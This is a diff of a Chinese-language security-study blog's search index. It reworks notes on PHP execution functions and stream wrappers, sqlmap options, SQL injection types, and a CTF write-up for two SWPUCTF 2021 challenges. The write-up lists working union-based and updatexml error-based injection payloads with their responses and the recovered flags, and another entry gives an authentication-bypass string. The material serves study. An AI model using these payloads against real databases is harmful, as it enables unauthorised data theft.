@@ -6,42 +6,29 @@
     <content><![CDATA[<p><img src="/images/RE4wyTn.jpg" alt="Bing 2023/6/28"></p>
 <p><img src="/images/RE4GpUM.jpg" alt="Bing 2023/6/28"></p>
 <p><img src="/images/RE4wEae.jpg" alt="RE4wEae"></p>
+<p><img src="/images/RE4wtd6.jpg" alt="RE4wtd6"></p>
 ]]></content>
   </entry>
   <entry>
-    <title>程序执行函数</title>
-    <url>/2023/08/05/%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<p><a href="https://www.php.net/manual/zh/ref.exec.php">程序执行函数</a></p>
-<hr>
-<ul>
-<li><code>escapeshellarg</code> — 把字符串转义为可以在 shell 命令里使用的参数</li>
-<li><code>escapeshellcmd</code> — shell 元字符转义</li>
-<li><code>exec</code> — 执行一个外部程序</li>
-<li><code>passthru</code> — 执行外部程序并且显示原始输出</li>
-<li><code>proc_close</code> — 关闭由 proc_open 打开的进程并且返回进程退出码</li>
-<li><code>proc_get_status</code> — 获取由 proc_open 函数打开的进程的信息</li>
-<li><code>proc_nice</code> — 修改当前进程的优先级</li>
-<li><code>proc_open</code> — 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</li>
-<li><code>proc_terminate</code> — 杀死由 proc_open 打开的进程</li>
-<li><code>shell_exec</code>— 通过 shell 执行命令并将完整的输出以字符串的方式返回</li>
-<li><code>system</code> — 执行外部程序，并且显示输出</li>
-</ul>
+    <title>支持的协议和封装协议</title>
+    <url>/2023/06/30/PHP/%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<p>file:&#x2F;&#x2F; — 访问本地文件系统<br>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址<br>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>zlib:&#x2F;&#x2F; — 压缩流<br>data:&#x2F;&#x2F; — 数据（RFC 2397）<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式<br>phar:&#x2F;&#x2F; — PHP 归档<br>ssh2:&#x2F;&#x2F; — 安全外壳协议 2<br>rar:&#x2F;&#x2F; — RAR<br>ogg:&#x2F;&#x2F; — 音频流<br>expect:&#x2F;&#x2F; — 处理交互式的流  </p>
+<p><a href="https://www.php.net/manual/zh/wrappers.php">官网文档</a></p>
+<span id="more"></span>
+<h3 id="file"><a href="#file" class="headerlink" title="file&#x2F;&#x2F;"></a>file&#x2F;&#x2F;</h3><p>用法<br>file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</p>
+<h3 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h3><p>用法<br><a href="http://example.com/">http://example.com</a></p>
+<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp:&#x2F;&#x2F;"></a>ftp:&#x2F;&#x2F;</h3><p>用法<br><a href="ftp://example.com/pub/file.txt">ftp://example.com/pub/file.txt</a></p>
+<h3 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。</p>
+<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br>示例  php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;&lt;待过滤的数据流&gt;</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>数据流包装器<br><a href="https://blog.csdn.net/q20010619/article/details/120833148">PHP Phar反序列化总结</a></p>
 ]]></content>
       <categories>
         <category>PHP</category>
       </categories>
   </entry>
   <entry>
-    <title>建站相关</title>
-    <url>/2023/06/28/%E5%BB%BA%E7%AB%99%E7%9B%B8%E5%85%B3/</url>
-    <content><![CDATA[<p><a href="https://hexo.io/zh-cn/docs/index.html">Hexo</a></p>
-<p><a href="https://theme-next.js.org/">Next</a></p>
-<p><a href="https://markdown.com.cn/basic-syntax/">Markdown</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>超全局变量</title>
-    <url>/2023/08/05/%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
+    <url>/2023/08/05/PHP/%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
     <content><![CDATA[<p>超全局变量 — 在全部作用域中始终可用的内置变量<br><a href="https://www.php.net/manual/zh/language.variables.superglobals.php">PHP: 超全局变量 - Manual</a></p>
 <hr>
 <ul>
@@ -61,17 +48,23 @@
       </categories>
   </entry>
   <entry>
-    <title>支持的协议和封装协议</title>
-    <url>/2023/06/30/PHP/%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<p>file:&#x2F;&#x2F; — 访问本地文件系统<br>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址<br>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>zlib:&#x2F;&#x2F; — 压缩流<br>data:&#x2F;&#x2F; — 数据（RFC 2397）<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式<br>phar:&#x2F;&#x2F; — PHP 归档<br>ssh2:&#x2F;&#x2F; — 安全外壳协议 2<br>rar:&#x2F;&#x2F; — RAR<br>ogg:&#x2F;&#x2F; — 音频流<br>expect:&#x2F;&#x2F; — 处理交互式的流  </p>
-<p><a href="https://www.php.net/manual/zh/wrappers.php">官网文档</a></p>
-<span id="more"></span>
-<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file&#x2F;&#x2F;"></a>file&#x2F;&#x2F;</h3><p>用法<br>file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</p>
-<h3 id="http-x2F-x2F"><a href="#http-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h3><p>用法<br><a href="http://example.com/">http://example.com</a></p>
-<h3 id="ftp-x2F-x2F"><a href="#ftp-x2F-x2F" class="headerlink" title="ftp:&#x2F;&#x2F;"></a>ftp:&#x2F;&#x2F;</h3><p>用法<br><a href="ftp://example.com/pub/file.txt">ftp://example.com/pub/file.txt</a></p>
-<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。</p>
-<h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br>示例  php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;&lt;待过滤的数据流&gt;</p>
-<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>数据流包装器<br><a href="https://blog.csdn.net/q20010619/article/details/120833148">PHP Phar反序列化总结</a></p>
+    <title>程序执行函数</title>
+    <url>/2023/08/05/PHP/%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<p><a href="https://www.php.net/manual/zh/ref.exec.php">程序执行函数</a></p>
+<hr>
+<ul>
+<li><code>escapeshellarg</code> — 把字符串转义为可以在 shell 命令里使用的参数</li>
+<li><code>escapeshellcmd</code> — shell 元字符转义</li>
+<li><code>exec</code> — 执行一个外部程序</li>
+<li><code>passthru</code> — 执行外部程序并且显示原始输出</li>
+<li><code>proc_close</code> — 关闭由 proc_open 打开的进程并且返回进程退出码</li>
+<li><code>proc_get_status</code> — 获取由 proc_open 函数打开的进程的信息</li>
+<li><code>proc_nice</code> — 修改当前进程的优先级</li>
+<li><code>proc_open</code> — 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</li>
+<li><code>proc_terminate</code> — 杀死由 proc_open 打开的进程</li>
+<li><code>shell_exec</code>— 通过 shell 执行命令并将完整的输出以字符串的方式返回</li>
+<li><code>system</code> — 执行外部程序，并且显示输出</li>
+</ul>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -110,44 +103,17 @@
       </categories>
   </entry>
   <entry>
-    <title>万能密码</title>
-    <url>/2023/06/28/SQL/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1--</span><br></pre></td></tr></table></figure>
+    <title>建站相关</title>
+    <url>/2023/06/28/%E5%BB%BA%E7%AB%99%E7%9B%B8%E5%85%B3/</url>
+    <content><![CDATA[<p><a href="https://hexo.io/zh-cn/docs/index.html">Hexo</a></p>
+<p><a href="https://theme-next.js.org/">Next</a></p>
+<p><a href="https://markdown.com.cn/basic-syntax/">Markdown</a></p>
 ]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
   </entry>
   <entry>
-    <title>常见解</title>
-    <url>/2023/06/29/SQL/%E5%B8%B8%E8%A7%81%E8%A7%A3/</url>
-    <content><![CDATA[<h4 id="某例题"><a href="#某例题" class="headerlink" title="某例题"></a>某例题</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">?wllm=1</span><br><span class="line">?wllm=1&#x27;</span><br><span class="line"></span><br><span class="line">报错，数字型，字符型</span><br></pre></td></tr></table></figure>
-
-<p>查看字段列数</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; order by 3--+</span><br><span class="line">?wllm=-1&#x27; order by 4--+</span><br><span class="line"></span><br><span class="line">?wllm=1&#x27; order by 4--+报错，所以为3列</span><br></pre></td></tr></table></figure>
-
-<p>查看回显：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
-
-<p>查数据库名：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
-
-<p>查看test_db库的表</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></figure>
-
-<p>查字段：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27;--+</span><br></pre></td></tr></table></figure>
-
-<p>出现flag字段，查看flag字段的内容：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(id,flag) from test_tb--+ </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">information_schema</span><br><span class="line"></span><br><span class="line">schemata(schema_name)</span><br><span class="line"></span><br><span class="line">tables(table_schema,table_name)</span><br><span class="line"></span><br><span class="line">columns(table_schema,table_name,column_name)</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;;</span><br><span class="line"></span><br><span class="line">select concat(username,password) from dvwa.users;</span><br></pre></td></tr></table></figure>
-
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1))#</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>命令</p>
+    <title>SQLmap</title>
+    <url>/2023/06/29/SQL%E6%B3%A8%E5%85%A5/SQLmap/</url>
+    <content><![CDATA[<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>命令</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-u URL, --url=URL   Target URL (e.g. <span class="string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-a, --<span class="built_in">all</span>           Retrieve everything</span><br><span class="line">-b, --banner        Retrieve DBMS banner</span><br><span class="line">--current-user      Retrieve DBMS current user</span><br><span class="line">--current-db        Retrieve DBMS current database</span><br><span class="line">--passwords         Enumerate DBMS users password hashes</span><br><span class="line">--dbs               Enumerate DBMS databases</span><br><span class="line">--tables            Enumerate DBMS database tables</span><br><span class="line">--columns           Enumerate DBMS database table columns</span><br><span class="line">--schema            Enumerate DBMS schema</span><br><span class="line">--dump              Dump DBMS database table entries</span><br><span class="line">--dump-<span class="built_in">all</span>          Dump <span class="built_in">all</span> DBMS databases tables entries</span><br><span class="line">-D DB               DBMS database to <span class="built_in">enumerate</span></span><br><span class="line">-T TBL              DBMS database table(s) to <span class="built_in">enumerate</span></span><br><span class="line">-C COL              DBMS database table column(s) to <span class="built_in">enumerate</span></span><br></pre></td></tr></table></figure>
 
 <p>示例</p>
@@ -158,16 +124,94 @@
       </categories>
   </entry>
   <entry>
+    <title>万能密码</title>
+    <url>/2023/06/28/SQL%E6%B3%A8%E5%85%A5/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1--</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>示例</title>
+    <url>/2023/08/29/SQL%E6%B3%A8%E5%85%A5/%E4%BE%8B/</url>
+    <content><![CDATA[<p>[SWPUCTF 2021 新生赛]easy_sql<br>[SWPUCTF 2021 新生赛]error</p>
+<span id="more"></span>
+<h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p>title 指出参数是 wllm</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,3%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>Your Login name:2<br>Your Password:3<br>得到回显位置</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>Your Login name:2<br>Your Password:information_schema,mysql,performance_schema,test,test_db<br>得到所有库</p>
+<blockquote>
+<p><code>-1&#39; union select 1,2,3%23</code><br>回显：<br>Your Login name:2<br>Your Password:test_db</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>Your Login name:2<br>Your Password:test_tb,users<br>得到当前库下的所有表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>Your Login name:2<br>Your Password:id,flag<br>得到当前表的所有字段</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,flag from test_tb%23</span></span><br></pre></td></tr></table></figure>
+
+<p>Your Login name:2<br>Your Password:NSSCTF{50e86d3f-87b2-4026-8bbe-690783fd7b27}</p>
+<h2 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>没有提示………..<br>没有显示的位置，有报错信息，尝试报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;0x7e&#x27;),1)%23 </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>0x7e 即 ~</p>
+</blockquote>
+<p>回显：<br>XPATH syntax error: <code>&#39;~test_db~&#39;</code><br>得到当前库</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;),1)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>XPATH syntax error: <code>&#39;~test_tb~&#39;</code><br>得到当前表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27; limit 1,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;),1)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>XPATH syntax error: <code>&#39;~flag~&#39;</code><br>得到字段名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select flag from test_tb)),1)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>XPATH syntax error: ‘~NSSCTF{10dbc0b4-35cb-4537-beac-‘<br>发现只有一半</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select right(flag,30) from test_tb)),1)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显：<br>XPATH syntax error: ‘~4-35cb-4537-beac-0d2ba98fa602}’<br>得到右半边</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>漏洞类型</title>
+    <url>/2023/06/28/SQL%E6%B3%A8%E5%85%A5/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/</url>
+    <content><![CDATA[<p>常见的SQL注入类型</p>
+<span id="more"></span>
+<h3 id="数字型和字符型"><a href="#数字型和字符型" class="headerlink" title="数字型和字符型"></a>数字型和字符型</h3><p>数字型：“1+1&#x3D;2”<br>字符型：“2”+“2”&#x3D;“22”</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用数据库报错判断是否存在注入点<br>常用函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">count</span>(),rand(),<span class="keyword">group</span> <span class="keyword">by</span></span><br></pre></td></tr></table></figure>
+
+<p>常用特殊字符</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#x27; \ ; %00 ) ( # &quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="1-时间型盲注"><a href="#1-时间型盲注" class="headerlink" title="1. 时间型盲注"></a>1. 时间型盲注</h4><p>利用 if sleep() 查看是否存在延时，分析是否存在注入</p>
+<h4 id="2-布尔型盲注"><a href="#2-布尔型盲注" class="headerlink" title="2. 布尔型盲注"></a>2. 布尔型盲注</h4><p>通过返回状态猜解，二分法与 ASCII 值比较，判断每一位字符</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>执行多条SQL语句<br>Oracle 不支持堆叠查询注入</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>主要是利用 UNION</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h3><h3 id="编码注入"><a href="#编码注入" class="headerlink" title="编码注入"></a>编码注入</h3><h3 id="XFF-注入攻击"><a href="#XFF-注入攻击" class="headerlink" title="XFF 注入攻击"></a>XFF 注入攻击</h3><p>X-Forware-For</p>
+<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3>]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+  </entry>
+  <entry>
     <title>常用函数</title>
-    <url>/2023/06/28/SQL/%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <url>/2023/06/28/SQL%E6%B3%A8%E5%85%A5/%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<p>SQL注入常用函数</p>
 <span id="more"></span>
-<h4 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h4><p>left() 函数从提供的字符串的左侧提取给定数量的字符。<br>例如， <code>LEFT(&#39;SQL Server&#39;，3)</code> 返回SQL。</p>
+<h4 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h4><p>left() 函数从提供的字符串的左侧提取给定数量的字符。<br>例如， <code>LEFT(&#39;SQL Server&#39;，3)</code> 返回 <code>SQL</code> 。</p>
 <h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>substr()、substring()功能相同，均为截取字符串</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(string, <span class="keyword">start</span>, length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> 子字符串的起始位置(起始值是<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">length（可选） 指定要返回的子字符串的字符数, 如果省略，则返回剩余文本。</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(string, <span class="keyword">start</span>, length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> 子字符串的起始位置(起始值是<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">length (可选)指定要返回的子字符串的字符数, 如果省略，则返回剩余文本。</span><br></pre></td></tr></table></figure>
 
 <h4 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h4><p>mid 函数用于从文本字段中提取字符</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mid(string, <span class="keyword">start</span>, kength)</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> 必需。规定开始位置（起始值是 <span class="number">1</span>）</span><br><span class="line"></span><br><span class="line">length（可选） 要返回的字符数, 如果省略，则 MID() 函数返回剩余文本。</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mid(string, <span class="keyword">start</span>, length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> 必需。规定开始位置（起始值是 <span class="number">1</span>）</span><br><span class="line"></span><br><span class="line">length（可选） 要返回的字符数, 如果省略，则 MID() 函数返回剩余文本。</span><br></pre></td></tr></table></figure>
 
 <h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII()"></a>ASCII()</h4><p>返回字符表达式最左侧字符的ASCII代码值</p>
 <h4 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h4><p>返回字符串第一个字符的 ASCII 值</p>
@@ -185,37 +229,17 @@
 <h4 id="LIKE"><a href="#LIKE" class="headerlink" title="LIKE()"></a>LIKE()</h4><p>模糊查询 %</p>
 <h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果</p>
 <h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>将多个字符串连接成一个字符串</p>
-<h4 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h4><h4 id="length（）"><a href="#length（）" class="headerlink" title="length（）"></a>length（）</h4>]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>注入类型</title>
-    <url>/2023/06/28/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</url>
-    <content><![CDATA[<p>常见的SQL注入类型</p>
-<span id="more"></span>
-<h3 id="数字型和字符型"><a href="#数字型和字符型" class="headerlink" title="数字型和字符型"></a>数字型和字符型</h3><p>数字型：“1+1&#x3D;2”<br>字符型：“2”+“2”&#x3D;“22”</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用数据库报错判断是否存在注入点<br>常用函数</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">count</span>(),rand(),<span class="keyword">group</span> <span class="keyword">by</span></span><br></pre></td></tr></table></figure>
-
-<p>常用特殊字符</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#x27; \ ; %00 ) ( # &quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="1-时间型盲注"><a href="#1-时间型盲注" class="headerlink" title="1. 时间型盲注"></a>1. 时间型盲注</h4><p>利用 if sleep() 查看是否存在延时，分析是否存在注入</p>
-<h4 id="2-布尔型盲注"><a href="#2-布尔型盲注" class="headerlink" title="2. 布尔型盲注"></a>2. 布尔型盲注</h4><p>通过返回状态猜解，二分法与 ASCII 值比较，判断每一位字符</p>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>执行多条SQL语句<br>Oracle 不支持堆叠查询注入</p>
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>主要是利用 UNION</p>
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h3><h3 id="编码注入"><a href="#编码注入" class="headerlink" title="编码注入"></a>编码注入</h3><h3 id="XFF-注入攻击"><a href="#XFF-注入攻击" class="headerlink" title="XFF 注入攻击"></a>XFF 注入攻击</h3><p>X-Forware-For</p>
-]]></content>
+<h4 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h4><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4>]]></content>
       <categories>
         <category>SQL注入</category>
       </categories>
   </entry>
   <entry>
     <title>补充</title>
-    <url>/2023/06/29/SQL/%E8%A1%A5%E5%85%85/</url>
-    <content><![CDATA[<h3 id="数据库种类"><a href="#数据库种类" class="headerlink" title="数据库种类"></a>数据库种类</h3><span id="more"></span>
+    <url>/2023/06/29/SQL%E6%B3%A8%E5%85%A5/%E8%A1%A5%E5%85%85/</url>
+    <content><![CDATA[<h3 id="特殊"><a href="#特殊" class="headerlink" title="特殊"></a>特殊</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">information_schema</span><br><span class="line"></span><br><span class="line">schemata(schema_name)</span><br><span class="line"></span><br><span class="line">tables(table_schema,table_name)</span><br><span class="line"></span><br><span class="line">columns(table_schema,table_name,column_name)</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;;</span><br><span class="line"></span><br><span class="line">select concat(username,password) from dvwa.users;</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据库种类"><a href="#数据库种类" class="headerlink" title="数据库种类"></a>数据库种类</h3><span id="more"></span>
 <p><a href="http://sqlwiki.radare.cn/">sqlwiki</a></p>
 <h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>端口号：3306<br>注释符号：–，空格，&#x2F;**&#x2F;内联注释，#</p>
 <blockquote>
@@ -235,8 +259,11 @@
   </entry>
   <entry>
     <title>过滤应对</title>
-    <url>/2023/06/28/SQL/%E8%BF%87%E6%BB%A4%E5%BA%94%E5%AF%B9/</url>
